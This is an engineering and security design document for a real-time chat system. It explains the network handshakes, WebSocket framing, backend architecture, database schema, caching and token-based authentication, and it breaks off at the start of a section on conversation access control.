# Real-Time Chat System: Internal Engineering & Security Breakdown

> **Classification:** Internal Engineering / Security Document  
> **Audience:** Engineers, Security Reviewers, Interview Candidates  
> **Scope:** Full-stack real-time chat system (WebSocket, persistence, auth, delivery, security, ops)  
> **Version:** 1.0

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

This section narrates every user action and maps it precisely to system behavior — processes spawned, bytes sent, state machines advanced.

### 1.1 First Load: Page, Assets, and Authentication

**T=0ms — Alice opens her browser and navigates to `https://chat.example.com`**

What Alice sees: a blank tab, then a loading indicator.

What actually happens, in order:

1. The browser checks its DNS cache for `chat.example.com`. Cache miss. It queries the OS stub resolver. The stub resolver forwards to the configured recursive resolver (e.g., 8.8.8.8). The recursive resolver walks the DNS hierarchy: it knows the root nameservers, queries `.com` NS, then `example.com` NS, which returns `A: 104.21.0.1 TTL=300`. The answer is cached in the recursive resolver and in the browser for 300 seconds.

2. The browser initiates a TCP connection to `104.21.0.1:443`. SYN → SYN-ACK → ACK. One round trip.

3. TLS 1.3 handshake: ClientHello (cipher suites, X25519 key share) → ServerHello + Certificate + CertificateVerify + Finished (all one server flight) → client Finished. Symmetric keys derived. This costs one more RTT (or 0-RTT with session resumption).

4. `GET / HTTP/2` → server returns HTML shell (~3KB). Browser parses, fetches linked JS/CSS bundles from CDN (separate DNS resolution to `assets.cdn.example.com`, separate TCP+TLS connection, or reused if HTTP/2 connection coalescing applies). JS bundles are large (200–800KB gzipped) — these dominate page load time.

5. JavaScript bootstraps. The app framework (React/Vue) mounts the component tree. It checks for a stored authentication token — specifically, it checks `sessionStorage` for an access token. It also checks if a `refresh_token` `HttpOnly; Secure; SameSite=Strict` cookie is present (it cannot read this cookie from JS — it only knows it might exist if the server set it on last login).

**T~400ms — App makes auth check**

6. `GET /api/auth/me` is sent with `Authorization: Bearer {access_token}` (from sessionStorage). If access_token is expired, the client first calls `POST /api/auth/refresh` — the HttpOnly refresh cookie is automatically sent by the browser. The auth service validates the refresh token (looks it up in Redis), issues a new access token, returns it in the response body. The client stores the new access token in sessionStorage.

7. If no valid session exists at all, the client redirects to `/login`. Alice enters email + password. `POST /api/auth/login` sends credentials. The auth service validates, issues tokens, sets the cookie, returns the access token.

**T~600ms — Dashboard renders**

8. The React app renders Alice's conversation list. It calls `GET /api/conversations` (REST), which returns a paginated list of conversations with metadata (last message preview, unread count, participant info). This is a REST HTTP call — not WebSocket — because it is not real-time and benefits from HTTP caching.

### 1.2 Establishing the Real-Time Connection

**T~700ms — WebSocket connection initiated**

9. The app calls `new WebSocket('wss://chat.example.com/ws')`. Under the hood:
   - The browser sends an HTTP/1.1 `GET /ws` upgrade request (WebSocket cannot run over HTTP/2 push; it uses HTTP/1.1 upgrade or HTTP/2 extended CONNECT per RFC 8441, but HTTP/1.1 is standard practice).
   - The request includes `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key: <random base64>`, `Sec-WebSocket-Version: 13`.
   - Critically: the access token is sent as a query parameter `?token=...` OR as the first WebSocket message after connection. It cannot be sent in the `Authorization` header during the upgrade (browser WebSocket API does not support custom headers in the upgrade request).

10. The server validates the token, upgrades the connection to a full-duplex WebSocket, and registers this connection in the presence/connection registry (Redis).

11. The server sends a `connected` message with any missed messages since Alice's last seen timestamp (catch-up delivery).

### 1.3 Sending a Message

**T=0 (relative to send) — Alice types "Hello Bob" and presses Enter**

What Alice sees: the message appears in the UI immediately (optimistic update) with a "sending" indicator (clock icon).

What actually happens:

12. The client generates a client-side message ID (`client_msg_id`) — a UUID v4 — and sends a WebSocket text frame:
    ```json
    {
      "type": "message.send",
      "client_msg_id": "a1b2c3d4-...",
      "conversation_id": "conv-789",
      "content": "Hello Bob",
      "content_type": "text/plain"
    }
    ```

13. The WebSocket server receives the frame. It validates the message schema, checks authorization (is Alice a member of `conv-789`?), sanitizes the content, persists the message to PostgreSQL (or Cassandra), and then fans out the message to all connected participants of `conv-789`.

14. The server sends Alice an `ack` message containing her `client_msg_id` and the server-assigned `message_id`. The UI updates: clock icon → single checkmark (delivered to server).

15. The server looks up Bob's WebSocket connection (via Redis: `ws_registry:user:bob_id` → `server-node-2:conn-id-987`). If Bob is on a different server node, the message is published to a Redis Pub/Sub channel (`messages:conv-789`). The node that holds Bob's connection receives it and pushes it to Bob's WebSocket. Bob's UI shows the message. The server sends Alice a `delivered` event. The UI updates: single checkmark → double checkmark (delivered to Bob's device).

16. When Bob actually reads the message (his client tab is active, the message is in the viewport), Bob's client sends a `message.read` event. The server updates the read receipt in the DB and notifies Alice. Double checkmark → blue double checkmark (read).

**Timing breakdown:**
- Alice types and hits send: T=0
- Client sends WebSocket frame: T+1ms
- Server receives frame: T+RTT/2 (e.g., +25ms at 50ms RTT)
- Server persists to DB: T+35ms (10ms for DB write)
- Server fans out to Bob: T+37ms
- Bob's client receives message: T+RTT+37ms ≈ T+62ms
- Alice sees "delivered": T+RTT+38ms ≈ T+63ms

### 1.4 Receiving a Message (Bob's perspective)

17. Bob's browser is on a different server node. The WebSocket connection is idle, waiting for frames from the server. The OS's TCP stack receives an inbound TCP segment from the server. The segment completes a WebSocket frame. The browser's WebSocket implementation fires the `message` event. Bob's JavaScript event handler receives the JSON, parses it, updates the React state, and the DOM re-renders. Bob sees "Hello Bob" appear in real time.

---

## 2. Network Layer Flow

### 2.1 DNS Resolution (Full Detail)

```
Alice's Browser          OS Stub Resolver       Recursive Resolver        Root NS → .com NS → example.com NS
      |                        |                        |                              |
      |-- query: chat.ex... -->|                        |                              |
      |                        |-- check cache -------> |                              |
      |                        |   (miss)               |-- query root: .com? -------> |
      |                        |                        |<-- NS: a.gtld-servers.net -- |
      |                        |                        |-- query .com NS: example? -> |
      |                        |                        |<-- NS: ns1.example.com ----- |
      |                        |                        |-- query ns1: chat.ex? -----> |
      |                        |                        |<-- A: 104.21.0.1 TTL=300 -- |
      |                        |<-- 104.21.0.1 ---------|                              |
      |<-- 104.21.0.1 ---------|                        |                              |
```

**What every field means and why it matters:**

- **TTL=300:** This record is valid for 5 minutes. If the IP changes (failover, migration), clients with cached records continue sending traffic to the old IP for up to 300 seconds. For disaster recovery, use a low TTL (30–60 seconds) — but this increases recursive resolver load.
- **A vs AAAA:** A records are IPv4 (32-bit). AAAA records are IPv6 (128-bit). Modern clients use Happy Eyeballs (RFC 8305): query both A and AAAA in parallel, connect to whichever responds first, prefer IPv6. Production systems must serve both.
- **CNAME chains:** `chat.example.com` might CNAME to `chat.example.com.cdn.cloudflare.net` which has the A record. Each CNAME hop requires another DNS query. Chains longer than 3 hops cause notable latency.
- **DNSSEC:** Adds cryptographic signatures to DNS records. The recursive resolver validates the chain of signatures from the root to the record. Prevents cache poisoning. Without DNSSEC, a compromised recursive resolver can return a fake IP.
- **DNS-over-HTTPS (DoH):** Encrypts the DNS query itself over HTTPS, preventing ISP snooping. The browser (Chrome, Firefox) can bypass the OS resolver and use a hardcoded DoH provider. This is transparent to server operators.

### 2.2 TCP Three-Way Handshake

```
Client (ephemeral port: 54321)               Server (104.21.0.1:443)
           |                                          |
           |-- SYN [seq=1000, window=65535] -------> |
           |                                          | [allocate TCB, SYN_RCVD]
           |<-- SYN-ACK [seq=5000, ack=1001] ------- |
           | [ESTABLISHED]                            |
           |-- ACK [ack=5001] ---------------------> |
           |                                          | [ESTABLISHED]
           |                                          |
           | <---- 1 RTT before any data ----> |
```

**TCP Control Block (TCB):** The server allocates a data structure per half-open connection during SYN_RCVD state. A SYN flood attack fills this table. **SYN cookies** solve this: the server encodes connection state into the SYN-ACK sequence number (using a cryptographic hash of IP/port/timestamp). The server allocates NO state. Only when the ACK arrives does it reconstruct the TCB from the cookie. The trade-off: TCP options (like window scaling, timestamps, SACK) are lost because there is no state to negotiate them against. This slightly reduces throughput for legitimate connections under SYN cookie activation.

**Why WebSocket needs HTTP/1.1:** The HTTP upgrade mechanism requires a persistent connection that stays open after the response. HTTP/2 multiplexes many streams over one TCP connection, each stream being independent. HTTP/2 does not support the HTTP/1.1 upgrade mechanism to WebSocket (though HTTP/2 Extended CONNECT per RFC 8441 allows WebSocket-like streams over HTTP/2, it requires explicit server support). Most production systems use HTTP/1.1 for WebSocket and HTTP/2 for REST APIs on separate connections.

### 2.3 TLS 1.3 Handshake — Deep Dive

```
Client                                                      Server
  |                                                              |
  |-- ClientHello ------------------------------------------>   |
  |   Version: TLS 1.3 (0x0304)                                 |
  |   Random: 32 bytes (client_random)                          |
  |   Cipher suites: [TLS_AES_256_GCM_SHA384,                   |
  |                   TLS_CHACHA20_POLY1305_SHA256,              |
  |                   TLS_AES_128_GCM_SHA256]                    |
  |   Extensions:                                               |
  |     supported_versions: [1.3, 1.2]                          |
  |     supported_groups: [x25519, secp256r1, secp384r1]        |
  |     key_share: x25519 pubkey (32 bytes)                     |
  |     server_name: "chat.example.com"  (SNI)                  |
  |     psk_key_exchange_modes: [psk_dhe_ke]  (session resumpt) |
  |     pre_shared_key: [ticket from last session] (optional)   |
  |                                                              |
  |<-- ServerHello -------------------------------------------  |
  |    selected cipher: TLS_AES_256_GCM_SHA384                  |
  |    key_share: server's x25519 pubkey (32 bytes)             |
  |                                                              |
  |    Both sides now compute:                                   |
  |    shared_secret = ECDH(client_priv, server_pub)            |
  |                  = ECDH(server_priv, client_pub)            |
  |    (same value, Diffie-Hellman property)                     |
  |                                                              |
  |    HKDF-Extract(shared_secret, "handshake") -> hs_secret    |
  |    HKDF-Expand(hs_secret, "c hs traffic") -> client_hs_key  |
  |    HKDF-Expand(hs_secret, "s hs traffic") -> server_hs_key  |
  |                                                              |
  |<-- {Certificate} (encrypted with server_hs_key) ---------   |
  |    leaf cert: chat.example.com                              |
  |    intermediate cert: Example CA                            |
  |<-- {CertificateVerify} -----------------------------------   |
  |    signature over transcript hash (SHA-384 of all msgs)     |
  |    using server's RSA-2048 or ECDSA-P256 private key        |
  |<-- {Finished} (HMAC over handshake transcript) ----------   |
  |                                                              |
  |   Client verifies: cert chain, hostname, signature, Finished |
  |   Both derive application keys:                              |
  |   HKDF-Expand(hs_secret, "c ap traffic") -> client_app_key  |
  |   HKDF-Expand(hs_secret, "s ap traffic") -> server_app_key  |
  |                                                              |
  |-- {Finished} -------------------------------------------->  |
  |-- {Application Data, encrypted with client_app_key} ----->  |
```

**SNI (Server Name Indication):** The `server_name` extension tells the server which hostname the client is connecting to — before TLS is established. This allows one IP to host multiple TLS certificates (virtual hosting). The SNI is sent in cleartext in the ClientHello (before any encryption), meaning a passive network observer can see which domain you're connecting to. ECH (Encrypted ClientHello) is being standardized to close this gap.

**Session Resumption (0-RTT):** If the server sent a session ticket on the last connection, the client can send that ticket (PSK) in the ClientHello along with application data. The server can process this data before even sending its ServerHello — zero round trips. But 0-RTT has a replay vulnerability: a network attacker can replay the 0-RTT data. For safe data (idempotent reads) this is acceptable. For chat message sends, 0-RTT data should not be accepted. Implementations should only use 0-RTT for read-only operations.

**Certificate Transparency (CT):** All publicly-trusted TLS certificates must be logged in CT logs. The server includes SCTs (Signed Certificate Timestamps) proving the cert is logged. Browsers enforce this. This means a CA cannot silently issue a certificate for your domain — it would appear in the public CT log.

### 2.4 WebSocket Frame Format

After the HTTP upgrade, all communication is in WebSocket frames:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)    |             (16/64)           |
|N|V|V|V|       |S|             |                               |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+-------------------------------+
|     Extended payload length continued, if payload len == 127  |
+- - - - - - - - - - - - - - - -+-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+---------------------------------------------------------------+
```

**Key fields:**
- **FIN:** 1 = this is the final (or only) fragment. 0 = more fragments follow.
- **Opcode:** 1 = text frame (UTF-8 payload), 2 = binary frame, 8 = close, 9 = ping, 10 (0xA) = pong.
- **MASK bit:** Client-to-server frames MUST be masked. Server-to-client frames MUST NOT be masked. The masking key is 4 random bytes. The payload is XORed: `masked_byte[i] = byte[i] XOR mask_key[i % 4]`. This is NOT encryption — it's a protocol requirement to prevent proxy cache poisoning.
- **Payload length:** 7 bits. If < 126, that is the length. If 126, next 2 bytes are the length. If 127, next 8 bytes are the length. This allows frames up to 2^63 bytes, though in practice servers enforce a maximum (e.g., 1MB per frame for chat).

### 2.5 Latency and Failure Points

```
Phase                          Typical Latency     Failure Mode
─────────────────────────────────────────────────────────────────
DNS resolution (cache hit)     < 1ms               Cache poisoning
DNS resolution (cache miss)    20–200ms             DNS server down, NXDOMAIN
TCP handshake                  1 × RTT             SYN flood, firewall RST injection
TLS handshake (1.3, cold)      1 × RTT             Cert expired, wrong hostname
TLS 0-RTT resumption           0 RTT               Replay attack
HTTP upgrade (WebSocket)       1 × RTT             Load balancer drops WS connections
WebSocket established          0 (already open)    Proxy timeout, NAT timeout
Message send (WS frame)        ½ × RTT             Connection drop, server crash
DB write (PostgreSQL)          5–10ms local        Lock contention, connection exhaustion
Fan-out (Redis pub/sub)        < 1ms per hop       Redis down, subscription lag
Delivery to Bob                RTT (Bob to server)  Bob's connection dropped
```

---

## 3. Application Layer Flow

### 3.1 REST API Lifecycle (Conversation History Fetch)

```
GET /api/v1/conversations/conv-789/messages?before=msg-999&limit=50 HTTP/1.1
Host: chat.example.com
Authorization: Bearer eyJhbGci...
Accept: application/json
Accept-Encoding: gzip, br
X-Request-ID: 8f3a1b2c-...
Cookie: refresh_token=...; __cf_bm=...  (HttpOnly, Secure, SameSite=Strict)
```

**Server-side processing pipeline:**

1. **Load balancer / reverse proxy (nginx/Envoy):** Receives the TCP segment, reconstructs the HTTP request. Checks `X-Forwarded-For` header (or `CF-Connecting-IP` from Cloudflare) to record the real client IP. Selects an upstream API pod via consistent hashing or round-robin. Adds `X-Request-ID` if not already present. Forwards upstream.

2. **API Gateway middleware chain (in order):**
   a. **Request logging:** Log request line, headers (sanitize Authorization value), IP, timestamp. Assign trace context.
   b. **Rate limiting:** Check Redis key `rate:ip:104.x.x.x:GET:/api/v1/conversations` using a sliding window counter. Increment and check against limit. If exceeded: `429 Too Many Requests` with `Retry-After` header.
   c. **Authentication:** Extract JWT from `Authorization: Bearer` header. Decode header to get `alg` and `kid`. Fetch public key for `kid` from JWKS cache (refreshed every hour). Verify RS256 signature. Check `exp`, `iat`, `iss`, `aud`. Reject on any failure with `401`.
   d. **Authorization (coarse):** Does this user have the `user` role? Is their account active? If no: `403`.
   e. **Input validation:** Parse query parameters. `before` must be a valid message ID format (UUID or snowflake ID). `limit` must be integer 1–100. Reject with `400` and structured error on violation.
   f. **Route handler:** Executes business logic.

3. **Route handler:**
   ```
   1. Check Redis cache: GET conv:conv-789:messages:before:msg-999:limit:50
   2. Cache hit? Return immediately (content-type: application/json, add cache headers)
   3. Cache miss: Query PostgreSQL replica
      SELECT * FROM messages 
      WHERE conversation_id = $1 AND id < $2 
      ORDER BY id DESC LIMIT $3
      -- $1 = 'conv-789', $2 = 'msg-999', $3 = 50
   4. Verify user is a member of conv-789:
      SELECT 1 FROM conversation_members 
      WHERE conversation_id = $1 AND user_id = $2
   5. Decrypt any encrypted message content (if E2EE metadata is stored server-side)
   6. Serialize results to JSON
   7. Store in Redis with TTL=60s
   8. Return response
   ```

4. **Response construction:**
   ```
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8
   Content-Encoding: gzip
   Cache-Control: private, max-age=0, must-revalidate
   X-Request-ID: 8f3a1b2c-...
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; ...
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Referrer-Policy: strict-origin-when-cross-origin
   
   { "messages": [...], "has_more": true, "next_cursor": "msg-949" }
   ```

### 3.2 WebSocket Protocol: Message Types and Sequencing

The WebSocket connection carries a JSON-based application protocol. Every frame is a JSON object with a `type` field:

**Client → Server messages:**
```
message.send       Send a new message
message.read       Mark messages as read (bulk)
typing.start       Begin typing indicator
typing.stop        Stop typing indicator
presence.update    Update user presence (available/away/busy)
conversation.join  Subscribe to a conversation's events
conversation.leave Unsubscribe
ping               Keepalive (client-initiated)
```

**Server → Client messages:**
```
message.new        New message received in a conversation
message.updated    A message was edited
message.deleted    A message was deleted
message.ack        Acknowledgement of client's message.send
read.receipt       Another participant read a message
typing.indicator   Someone is typing in a conversation
presence.changed   A user's presence changed
error              Error response to a client message
pong               Response to client ping
```

**Sequencing and ordering guarantees:**

The server assigns each message a monotonically increasing ID within a conversation (using a PostgreSQL sequence or a Snowflake ID generator). The client uses this to detect gaps: if Alice receives message IDs 1, 2, 3, 5 — she knows message 4 is missing and can request it via REST. This is the "catch-up" mechanism.

### 3.3 Typing Indicators: Ephemeral State

Typing indicators are not persisted. They flow through Redis Pub/Sub only:

```
Alice types → client sends "typing.start" WS frame every 3 seconds
Server → Redis PUBLISH channel:conv-789 { type:"typing", user:"alice", expires: now+5s }
All subscribers to conv-789 → receive event → push to their WebSocket connections
Bob's UI shows "Alice is typing..."
Alice stops → client sends "typing.stop" OR timeout expires → indicator removed
```

If the server drops the event (Redis pub/sub is fire-and-forget, no persistence), the indicator simply doesn't show. This is acceptable — typing indicators are best-effort.

---

## 4. Backend Architecture

### 4.1 Full Service Topology

```
                    ┌─────────────────────────────────────────┐
                    │          CDN / Edge (Cloudflare)         │
                    │   Static assets, DDoS mitigation,        │
                    │   TLS termination at edge                │
                    └───────────────┬─────────────────────────┘
                                    │ HTTPS
                    ┌───────────────▼─────────────────────────┐
                    │         Load Balancer (L7, nginx/Envoy)  │
                    │   Routes: /ws → WS pods                  │
                    │           /api → API pods                │
                    └────────┬────────────────┬───────────────┘
                             │                │
            ┌────────────────▼──┐    ┌────────▼────────────────┐
            │  WebSocket Service │    │      REST API Service    │
            │  (Node.js cluster) │    │   (Node.js / Go / Java)  │
            │  - Connection mgmt │    │   - Auth middleware       │
            │  - Message routing │    │   - CRUD handlers         │
            │  - Presence        │    │   - Rate limiting         │
            └─────────┬──────────┘    └────────┬────────────────┘
                      │                        │
            ┌─────────▼────────────────────────▼──────────────┐
            │                Redis Cluster                      │
            │  • WebSocket connection registry                  │
            │  • Pub/Sub (fan-out)                             │
            │  • Presence state                                │
            │  • Rate limit counters                           │
            │  • Session/token cache                           │
            │  • Typing indicator ephemeral state              │
            │  • Message delivery status                       │
            └─────────────────────┬────────────────────────────┘
                                  │
            ┌─────────────────────▼────────────────────────────┐
            │              Message Queue (Kafka)                │
            │  Topics:                                          │
            │  • chat.messages (message persistence, fan-out)   │
            │  • chat.notifications (push, email)               │
            │  • chat.audit (compliance logging)                │
            │  • chat.search (search index updates)             │
            └──────┬─────────────────────────────┬─────────────┘
                   │                             │
       ┌───────────▼──────────┐     ┌────────────▼─────────────┐
       │  Message Worker Pool  │     │   Notification Worker    │
       │  - Persist to DB      │     │   - Push notifications   │
       │  - Update read status │     │   - Email (offline users)│
       │  - Search indexing    │     │   - Webhooks             │
       └───────────┬──────────┘     └──────────────────────────┘
                   │
       ┌───────────▼──────────────────────────────────────────┐
       │          PostgreSQL (Primary + Read Replicas)          │
       │  Tables: messages, conversations, members,            │
       │          users, attachments, read_receipts            │
       └──────────────────────────────────────────────────────┘
       
       ┌──────────────────────┐    ┌──────────────────────────┐
       │   Auth Service        │    │  Search Service           │
       │   (JWT, sessions,     │    │  (Elasticsearch)          │
       │    OAuth2, MFA)       │    │  - Full-text search       │
       └──────────────────────┘    └──────────────────────────┘
       
       ┌──────────────────────┐    ┌──────────────────────────┐
       │   Media Service       │    │  Presence Service         │
       │   (S3, image resize,  │    │  (tracks online status,  │
       │    virus scan)        │    │   last seen)              │
       └──────────────────────┘    └──────────────────────────┘
```

### 4.2 Message Fanout: The Core Problem

When Alice sends a message to a group conversation with 100 members, the server must deliver it to all 100 online members. This fan-out is the defining engineering challenge of chat systems.

**Approach 1: Push model (WebSocket fan-out via Redis Pub/Sub)**

```
Alice WS → Server Node A → Redis PUBLISH "conv-789" → {msg}
                                   │
         ┌─────────────────────────┼──────────────────────┐
         ▼                         ▼                       ▼
   Node A (Alice, 3       Node B (Bob, 15         Node C (Carol, 7
   members connected)     members connected)       members connected)
   → push to each WS      → push to each WS        → push to each WS
```

All server nodes subscribe to all conversations that have at least one connected user. When a message arrives on the pub/sub channel, each node iterates its connected users for that conversation and sends WebSocket frames.

**Scaling limit:** At 10,000 group members, all online, this is 10,000 WebSocket writes per message. Each write is a syscall (writev or send). On a single server at 60,000 messages/second, this is 6 × 10^8 syscalls/second — clearly impossible. Large group chats require special handling (see Section 13).

**Approach 2: Pull model (for large groups or offline users)**

Online users connected via WebSocket get messages pushed. Offline users or large groups above a threshold fall back to a pull model: the server does not push; instead, when the user reconnects, they fetch messages via REST since their last_seen_at timestamp. This hybrid push/pull is used by most large-scale chat systems (Slack, Discord, WhatsApp).

### 4.3 Message Persistence: Sync vs Async

**Critical design question:** Do you persist the message to the database BEFORE or AFTER delivering it to recipients?

**Synchronous (persist then deliver):**
```
Client → Server → DB write → fanout → ACK
```
- Pro: Message guaranteed durable before ACK. Client knows if DB write failed.
- Con: DB write latency (5–15ms) is added to every message's perceived send time.
- Used by: Slack, most enterprise chat systems.

**Asynchronous (deliver then persist):**
```
Client → Server → fanout (fast) → ACK
                       │
                       └→ Kafka → Message Worker → DB write
```
- Pro: Sub-millisecond ACK; feels instant.
- Con: If the server crashes between ACK and DB write, the message is lost. The client thinks it was delivered; the server has no record.
- Used by: Systems where eventual durability is acceptable.

**Recommendation:** Persist first (synchronous). Use PostgreSQL with `synchronous_commit = on`. The 5–15ms is imperceptible to users but provides strong durability guarantees. Use optimistic UI updates so the user sees their message immediately, but gray/italicized until the ACK arrives.

### 4.4 Database Schema (PostgreSQL)

```sql
-- Snowflake-style IDs: timestamp + worker_id + sequence
-- Allows sorting by time without querying, globally unique without coordination

CREATE TABLE users (
    id          BIGINT PRIMARY KEY,          -- Snowflake ID
    email       TEXT UNIQUE NOT NULL,
    display_name TEXT NOT NULL,
    avatar_url  TEXT,
    password_hash TEXT,                     -- Argon2id
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    last_seen_at TIMESTAMPTZ,
    status      TEXT DEFAULT 'active',      -- active, suspended, deleted
    settings    JSONB DEFAULT '{}'
);

CREATE TABLE conversations (
    id          BIGINT PRIMARY KEY,
    type        TEXT NOT NULL,              -- 'direct', 'group', 'channel'
    name        TEXT,                       -- null for direct messages
    created_by  BIGINT REFERENCES users(id),
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    last_message_at TIMESTAMPTZ,            -- for sorting conversations list
    settings    JSONB DEFAULT '{}'
);

CREATE TABLE conversation_members (
    conversation_id BIGINT REFERENCES conversations(id),
    user_id         BIGINT REFERENCES users(id),
    role            TEXT DEFAULT 'member', -- 'member', 'admin', 'owner'
    joined_at       TIMESTAMPTZ DEFAULT NOW(),
    last_read_message_id BIGINT,           -- for unread count calculation
    PRIMARY KEY (conversation_id, user_id)
);
CREATE INDEX idx_members_user ON conversation_members(user_id);

CREATE TABLE messages (
    id              BIGINT PRIMARY KEY,     -- Snowflake ID (sortable by time)
    conversation_id BIGINT REFERENCES conversations(id) NOT NULL,
    sender_id       BIGINT REFERENCES users(id) NOT NULL,
    content         TEXT,                   -- null if attachment-only
    content_type    TEXT DEFAULT 'text/plain', -- 'text/plain', 'text/markdown'
    sent_at         TIMESTAMPTZ DEFAULT NOW(),
    edited_at       TIMESTAMPTZ,
    deleted_at      TIMESTAMPTZ,            -- soft delete
    reply_to_id     BIGINT REFERENCES messages(id),
    metadata        JSONB DEFAULT '{}'      -- reactions, link previews, etc.
);
-- Critical index: fetch conversation messages in order, paginated
CREATE INDEX idx_messages_conv_id ON messages(conversation_id, id DESC);

CREATE TABLE attachments (
    id              BIGINT PRIMARY KEY,
    message_id      BIGINT REFERENCES messages(id),
    s3_key          TEXT NOT NULL,
    filename        TEXT,
    content_type    TEXT,
    size_bytes      BIGINT,
    thumbnail_key   TEXT
);

CREATE TABLE read_receipts (
    conversation_id BIGINT,
    user_id         BIGINT,
    last_read_message_id BIGINT,
    updated_at      TIMESTAMPTZ DEFAULT NOW(),
    PRIMARY KEY (conversation_id, user_id)
);
-- Note: This is the same data as conversation_members.last_read_message_id
-- Some systems denormalize both; some use only one. The dedicated table allows
-- more frequent updates without locking conversation_members.
```

**Why Snowflake IDs instead of UUIDs for messages?**
- UUID v4 is random — inserting in primary key order causes index fragmentation in PostgreSQL (B-tree pages split randomly, not sequentially).
- Snowflake IDs are time-ordered — inserts are sequential, B-tree pages fill sequentially, much better write performance.
- Snowflake ID structure: `[41 bits timestamp ms] [10 bits worker ID] [12 bits sequence]`. Worker ID prevents collisions across machines. Sequence handles multiple messages per millisecond per worker.
- Clients can compare IDs to determine ordering without fetching timestamps.

### 4.5 Caching Strategy

```
Layer 1: Browser (Cache-Control headers)
  - Static assets (JS/CSS): max-age=31536000, immutable (content-hashed filenames)
  - API responses: private, no-cache (user-specific, must revalidate)
  - Conversation list: private, max-age=30 (stale-while-revalidate=60)

Layer 2: CDN (Cloudflare/Fastly)
  - Static assets only: cached at 200+ PoPs globally
  - API responses: NOT cached (private data, session-dependent)

Layer 3: Redis (Application cache)
  Key: conv:{id}:messages:cursor:{cursor}:limit:{n}
  TTL: 60 seconds
  Eviction: LRU (allkeys-lru policy)
  
  Key: user:{id}:conversations  (list of conversation IDs with metadata)
  TTL: 30 seconds
  
  Key: user:{id}:profile  (display name, avatar)
  TTL: 300 seconds (profiles change infrequently)
  
  Key: conv:{id}:members  (set of user IDs)
  TTL: 600 seconds
  
  Key: session:{refresh_token_hash}  (maps to user_id)
  TTL: 2592000 (30 days, rolling)

Layer 4: PostgreSQL read replicas
  - Query results cached in PostgreSQL shared_buffers (8GB+)
  - Connection pooling via PgBouncer (transaction mode)
  - Read replicas handle SELECT; primary handles INSERT/UPDATE/DELETE
```

---

## 5. Authentication & Authorization Flow

### 5.1 Token Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│  Access Token (JWT, RS256)                                          │
│  ─────────────────────────                                          │
│  Header: { "alg": "RS256", "kid": "2024-q1-signing-key", "typ":"JWT"}
│  Payload:                                                           │
│    sub: "user-snowflake-id"      ← who this token is for           │
│    iss: "https://auth.example.com"                                  │
│    aud: "https://chat.example.com"  ← who should accept this       │
│    exp: 1714000900                  ← 15 minutes from issue        │
│    iat: 1714000000                                                  │
│    jti: "unique-token-id"           ← for revocation               │
│    email: "alice@example.com"                                       │
│    roles: ["user"]                                                  │
│    plan: "pro"                      ← feature flags                │
│  Signature: RS256(base64(header).base64(payload), private_key)     │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  Refresh Token                                                      │
│  ─────────────                                                      │
│  Value: CSPRNG 256-bit → base64url (opaque, no structure)          │
│  Storage (client): HttpOnly; Secure; SameSite=Strict cookie        │
│  Storage (server): Redis key = SHA-256(token) → { user_id,         │
│                                                    issued_at,       │
│                                                    device_id,       │
│                                                    ip_at_issue }    │
│  Lifetime: 30 days, rolling (reset on each use)                    │
│  Rotation: On each use, old token deleted, new token issued         │
└─────────────────────────────────────────────────────────────────────┘
```

**Why store SHA-256(refresh_token) in Redis instead of the token itself?**
If Redis is compromised, the attacker gets hashed tokens, not the tokens themselves. SHA-256 is a one-way function — they cannot reconstruct the original token from the hash. (Note: a brute-force attack against a 256-bit random token is computationally infeasible even with the hash.)

### 5.2 WebSocket Authentication Challenge

The browser's WebSocket API does not allow setting custom HTTP headers in the upgrade request. This creates an authentication problem. There are three approaches:

**Approach A: Query parameter token (common but risky)**
```
wss://chat.example.com/ws?token=eyJhbGci...
```
Risk: The URL (including query parameters) appears in server access logs, proxy logs, browser history, and Referrer headers. The token is exposed in plaintext in logs. If logs are leaked, all tokens are compromised.

**Approach B: First-message authentication (better)**
```
1. Client opens WebSocket (no auth yet)
2. Server sends: { "type": "auth_challenge", "nonce": "abc123" }
3. Client sends: { "type": "auth", "token": "eyJhbGci..." }
4. Server validates token, upgrades connection to authenticated state
5. If no auth message within 5 seconds: server closes connection
```
Risk: The window between connection and auth is a resource exhaustion opportunity. Attacker opens 10,000 connections, never authenticates. Server must enforce strict timeout and connection limits.

**Approach C: Short-lived WebSocket ticket (most secure)**
```
1. Client calls REST: POST /api/ws/ticket
   Authorization: Bearer {access_token}
   → Server issues short-lived (30s), single-use ticket: { "ticket": "ws-ticket-xyz" }
   → Stored in Redis with TTL=30s
2. Client opens WebSocket: wss://chat.example.com/ws?ticket=ws-ticket-xyz
3. Server validates ticket against Redis, deletes it (single-use), upgrades connection
4. Ticket is random, short-lived, not a JWT → if logged, it's expired before an attacker could use it
```

This is the most secure approach, used by Slack and Discord.

### 5.3 Authorization: Room/Conversation Access

```
